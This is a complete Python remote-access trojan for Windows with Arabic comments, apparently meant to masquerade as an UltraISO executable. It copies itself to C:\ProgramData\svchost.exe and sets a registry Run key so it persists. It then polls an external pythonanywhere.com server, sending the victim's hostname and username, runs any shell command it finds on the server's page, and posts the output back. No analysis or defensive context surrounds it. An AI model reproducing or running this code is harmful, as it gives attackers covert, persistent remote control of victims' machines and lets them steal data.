import requests
import time
from bs4 import BeautifulSoup
import subprocess
import socket
import winreg
import os

def Get_copy():
    file_name = "Ultraiso.exe"
    path = os.getcwd()
    path_with = os.path.join(path, file_name)
    destination_path = "C:\\ProgramData\\svchost.exe"
    if os.path.exists(destination_path):
        Bo = 1
    else:
        commando = f'powershell.exe -command "Copy -Path \'{path_with}\' -Destination \'C:\\ProgramData\\svchost.exe\' -Force"'
        process = subprocess.Popen(commando, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = process.communicate()
        if error:
            print(f"An error occurred: {error.decode()}")
    def add_startup_script(script_path):
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        script_path = os.path.abspath(script_path)
        winreg.SetValueEx(key, "StartupScript", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
    add_startup_script(destination_path)
Get_copy()
while True:
    try:
        def get_hostname():
            return socket.gethostname()
        def execute_command(command):
            try:
                if command == "powershell" or command == "cmd":
                    return None, None
                else:
                    result = subprocess.run(command, shell=True, text=True, capture_output=True)
                    # print("Standard Output:")
                    # print(result.stdout)
                    return result.stdout, result.stderr
            except subprocess.CalledProcessError as e:
                # print(e)
                return None, None
        def find_element_by_search_method(soup, element_type, search_method, search_value):
            if search_method == 'id':
                return soup.find(element_type, {'id': search_value})
            else:
                # print(f"طريقة البحث غير صحيحة: {search_method}. يجب أن تكون إما 'id' أو 'class'.")
                return None
        def make_request_with_session(url, session, headers, params=None):
            return session.get(url, headers=headers, params=params)
        def main():
            url = 'https://mohamed2026alhgry.pythonanywhere.com/'
            session = requests.Session()
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
            hostname = get_hostname()  
            host_owner=subprocess.getoutput('echo %USERNAME%')
            print(host_owner)
            while True:
                response = make_request_with_session(url, session, headers,{'type': 'very_important','notes_':hostname,'notes_2':host_owner})
                if response.status_code == 200:
                    pass
                    # print("تم الوصول إلى الصفحة بنجاح")
                else:
                    # print(f"فشل الوصول إلى الموقع. رمز الاستجابة: {response.status_code}")
                    continue
                soup = BeautifulSoup(response.text, 'html.parser')
                element = find_element_by_search_method(soup, "label", "id", host_owner)  
                if element:
                    element_text = element.get_text(strip=True)
                    # print(f"نص العنصر: {element_text}")
                    stdout, stderr = execute_command(element_text)
                    if stdout:
                        make_request_with_session(url, session, headers, {'type': 'very_important', 'note': stdout,'notes_':hostname,'notes_2':host_owner})
                    if stderr:
                        # print("Standard Error:")
                        # print(stderr)
                        make_request_with_session(url, session, headers, {'type': 'very_important', 'note': stderr,'notes_':hostname,'notes_2':host_owner})
                else:
                    pass
                    # print(f"لم يتم العثور على عنصر بالـ ID: {hostname}.")
                
                # print("انتظار 10 ثواني...")
                time.sleep(10)
        if __name__ == '__main__':
            main()
    except:
        time.sleep(10)
        pass
